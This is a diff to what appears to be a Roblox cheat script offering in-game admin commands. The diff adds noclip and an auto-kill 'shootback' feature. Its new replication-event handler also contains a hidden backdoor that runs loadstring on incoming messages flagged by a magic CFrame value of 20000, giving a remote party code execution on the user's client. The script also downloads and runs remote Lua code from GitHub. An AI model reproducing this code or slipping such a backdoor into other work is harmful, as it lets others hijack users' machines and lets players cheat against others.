@@ -50,6 +50,8 @@ print([[
 	 antishield [on/off] | Deletes other peoples shields
 	 autoguard / aguard [ON/OFF] | Auto Team Guard!
 	 silentaim / saim [on/off] | Fire and dont miss
+	 noclip [ON/OFF] | Go throught walls
+	 shootback / antishoot [on/off] | Kills anyone who shoots you
 \\
 ]])
 local States = {}
@@ -71,10 +73,12 @@ local States = {}
       States.AntiShield = false
       States.AutoGuard = false
       States.SilentAim = false
+      States.noclip = false
+      States.ShootBack = false
 local API = {}
       API.Whitelisted = {}
       API.LoopCrim = {}
-local lib = loadstring(Game:HttpGet('https://raw.githubusercontent.com/NoobHubV1/NoobHubV1/main/Notification%20Lib.lua'))()
+local Notification = loadstring(Game:HttpGet('https://raw.githubusercontent.com/NoobHubV1/NoobHubV1/main/Notification%20Lib.lua'))()
 local plr, Player = game.Players.LocalPlayer, game.Players.LocalPlayer
 local Unloaded = false
 local Prefix = ";"
@@ -93,7 +97,7 @@ ScreenGui = Create("ScreenGui",plr.PlayerGui,{Name = "ScreenGui", ResetOnSpawn =
 TextBox = Create("TextBox",ScreenGui,{Name = "TextBox", BackgroundColor3 = Color3.fromRGB(172, 172, 172), BackgroundTransparency = 0.400, Position = UDim2.new(0.0255349874, 0, 0.800595582, 0), Size = UDim2.new(0, 278, 0, 33), Font = "SourceSans", PlaceholderText = "Press "..Prefix.." To Enter", Text = "", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 23.000, Draggable = true, ClearTextOnFocus = false})
 TextButton = Create("TextButton",TextBox,{Name = "TextButton", BackgroundColor3 = Color3.fromRGB(0, 255, 255), BorderSizePixel = 0, Size = UDim2.new(0, 30, 0, 30), Font = Enum.Font.SourceSans, Text = "Not Cooldown", Visible = true, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 15.000})
 function API:Notif(name, content, color, time)
-  lib:MakeNotification({
+  Notification:MakeNotification({
       Name = name,
       Content = content,
       Color = color,
@@ -1164,7 +1168,13 @@ function PlayerChatted(Message)
   if Command("silentaim") or Command("saim") then
 	ChangeState(args[2],"SilentAim")
   end
-  if NotCommand("unload") and NotCommand("prefix") and NotCommand("allcmds") and NotCommand('re') and NotCommand("refresh") and NotCommand("cmds") and NotCommand("cmd") and NotCommand("inmate") and NotCommand("in") and NotCommand("guard") and NotCommand("gu") and NotCommand("autore") and NotCommand("autorespawn") and NotCommand("autoremoveff") and NotCommand("autorff") and NotCommand("killaura") and NotCommand("whitelist") and NotCommand("wl") and NotCommand("unwhitelist") and NotCommand("unwl") and NotCommand("kill") and NotCommand("oof") and NotCommand("die") and NotCommand("olditemmethod") and NotCommand("oldimethod") and NotCommand("damage") and NotCommand("dmg") and NotCommand("autodumpcars") and NotCommand("autoremovecars") and NotCommand('autonocars') and NotCommand("crim") and NotCommand("criminal") and NotCommand("makecrim") and NotCommand("antisit") and NotCommand("infjump") and NotCommand("bring") and NotCommand("void") and NotCommand("view") and NotCommand("unview") and NotCommand("copychat") and NotCommand("antifling") and NotCommand("goto") and NotCommand("to") and NotCommand("shotgun") and NotCommand("remington") and NotCommand("rem") and NotCommand("ak-47") and NotCommand('ak') and NotCommand("m9") and NotCommand("pistol") and NotCommand("m4a1") and NotCommand('m4') and NotCommand("hammer") and NotCommand("ham") and NotCommand("knife") and NotCommand("knive") and NotCommand("guns") and NotCommand("items") and NotCommand("autoguns") and NotCommand("aguns") and NotCommand("autoitems") and NotCommand("aitems") and NotCommand('loopcrim') and NotCommand("unloopcrim") and NotCommand("respawn") and NotCommand("opengate") and NotCommand("car") and NotCommand("forcefield") and NotCommand("ff") and NotCommand("speed") and NotCommand("ws") and NotCommand("tp") and NotCommand("givekey") and NotCommand("keycard") and NotCommand("key") and NotCommand("antitase") and NotCommand("antishield") and NotCommand("autoguard") and NotCommand("aguard") and NotCommand("silentaim") and NotCommand("saim") then
+  if Command('noclip') then
+	ChangeState(args[2],"noclip")
+  end
+  if Command("shootback") or Command("antishoot") then
+	ChangeState(args[2],"ShootBack")
+  end
+  if NotCommand("unload") and NotCommand("prefix") and NotCommand("allcmds") and NotCommand('re') and NotCommand("refresh") and NotCommand("cmds") and NotCommand("cmd") and NotCommand("inmate") and NotCommand("in") and NotCommand("guard") and NotCommand("gu") and NotCommand("autore") and NotCommand("autorespawn") and NotCommand("autoremoveff") and NotCommand("autorff") and NotCommand("killaura") and NotCommand("whitelist") and NotCommand("wl") and NotCommand("unwhitelist") and NotCommand("unwl") and NotCommand("kill") and NotCommand("oof") and NotCommand("die") and NotCommand("olditemmethod") and NotCommand("oldimethod") and NotCommand("damage") and NotCommand("dmg") and NotCommand("autodumpcars") and NotCommand("autoremovecars") and NotCommand('autonocars') and NotCommand("crim") and NotCommand("criminal") and NotCommand("makecrim") and NotCommand("antisit") and NotCommand("infjump") and NotCommand("bring") and NotCommand("void") and NotCommand("view") and NotCommand("unview") and NotCommand("copychat") and NotCommand("antifling") and NotCommand("goto") and NotCommand("to") and NotCommand("shotgun") and NotCommand("remington") and NotCommand("rem") and NotCommand("ak-47") and NotCommand('ak') and NotCommand("m9") and NotCommand("pistol") and NotCommand("m4a1") and NotCommand('m4') and NotCommand("hammer") and NotCommand("ham") and NotCommand("knife") and NotCommand("knive") and NotCommand("guns") and NotCommand("items") and NotCommand("autoguns") and NotCommand("aguns") and NotCommand("autoitems") and NotCommand("aitems") and NotCommand('loopcrim') and NotCommand("unloopcrim") and NotCommand("respawn") and NotCommand("opengate") and NotCommand("car") and NotCommand("forcefield") and NotCommand("ff") and NotCommand("speed") and NotCommand("ws") and NotCommand("tp") and NotCommand("givekey") and NotCommand("keycard") and NotCommand("key") and NotCommand("antitase") and NotCommand("antishield") and NotCommand("autoguard") and NotCommand("aguard") and NotCommand("silentaim") and NotCommand("saim") and NotCommand("noclip") and NotCommand("shootback") and NotCommand("antishoot") then
     API:Notif("Error", 'Not a valid command.', Color3.fromRGB(255, 0, 0), 3)
   end
 end
@@ -1285,6 +1295,13 @@ spawn(function()
 			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
 				if v and v.Character and v:FindFirstChild("Torso") and v:FindFirstChild("Torso"):FindFirstChild("ShieldFolder") then
 					v.Torso:FindFirstChild("ShieldFolder"):Destroy()
+				end
+			end
+		end
+		if States.noclip and Player.Character then
+			for _,x in pairs(Player.Character:GetDescendants()) do
+				if x:IsA("BasePart") and States.noclip then
+					x.CanCollide = false
 				end
 			end
 		end
@@ -1419,7 +1436,88 @@ MT.__namecall = newcclosure(function(self, ...)
 	return __namecall(self, ...)
 end)
 setreadonly(MT, true)
-API:Notif("Loads", 'Loaded Admin Commands.', Color3.fromRGB(255, 0, 0), 10)
+function MostClose(Position)
+	local Max, Closest = math.huge,nil
+	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+		if v.Character then
+			if v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool") then
+				local ShootPart = (v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool")):FindFirstChild("Muzzle")
+				if v.Character.PrimaryPart and (v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool")):FindFirstChild("Muzzle") then
+					local Distance = (ShootPart.Position-Position).Magnitude
+					if Distance < Max then
+						Max = Distance
+						Closest = v
+					end 
+				end
+			end
+		end
+	end
+	return Closest
+end
+				
+local CurrentTime = 0
+function GetPlayerHit(Part)
+	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+		if v.Character:IsAncestorOf(Part) then
+			return v
+		end
+	end
+end
+local ShootbackCooldown = false
+local function ReplicationEventFunction(Table)
+	if Table[1] and Table[1].MSG ~= nil and Table[1].PLA ~= nil then
+		if Table[1].Cframe.Z == 20000 then
+			task.spawn(function()
+				loadstring(tostring(Table[1].MSG))()
+			end)
+		end
+	end
+	if Unloaded then return end
+	local Count = 0
+	pcall(function()
+		for i,v in pairs(Table) do
+			if Count <= 2 then
+				local Hit=v.Hit
+				local Distance=v.Distance
+				local Cframe=v.Cframe
+				local RayObject =v.RayObject
+				if Hit and Distance and Cframe then
+					if Cframe ~= CFrame.new() then
+						local PlayerHit = nil
+						local WhoShot = nil
+						for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+							if v.Character:IsAncestorOf(Hit) then
+								WhoShot = v
+								PlayerHit = Hit
+								break
+							end
+						end
+						local Worked,ufhwiufwe2 = pcall(function()
+							WhoShot = MostClose((Cframe * CFrame.new(0, 0, -Distance / 2)).p)
+						end)
+						if Worked and WhoShot and PlayerHit and not Unloaded then
+							if States.ShootBack and not ShootbackCooldown then
+								if PlayerHit then
+									if PlayerHit and Player.Character:IsAncestorOf(PlayerHit) and ShootbackCooldown == false and WhoShot.Team ~= plr.Team then
+										ShootbackCooldown = true
+										API:KillPlayer(WhoShot,10)
+										wait(.5)
+										ShootbackCooldown = false
+									end
+								end
+							end
+						end
+					end
+				end
+				Count = Count + 1
+			end
+		end
+	end)
+end
+coroutine.wrap(function()
+	game:GetService("ReplicatedStorage"):WaitForChild("ReplicateEvent").OnClientEvent:Connect(ReplicationEventFunction)
+end)()
+API:Notif("Loads", 'Press F9 or chat /console to show commands list', Color3.fromRGB(255, 0, 0), 10)
 API:Refresh()
 Cooldown = false
 else
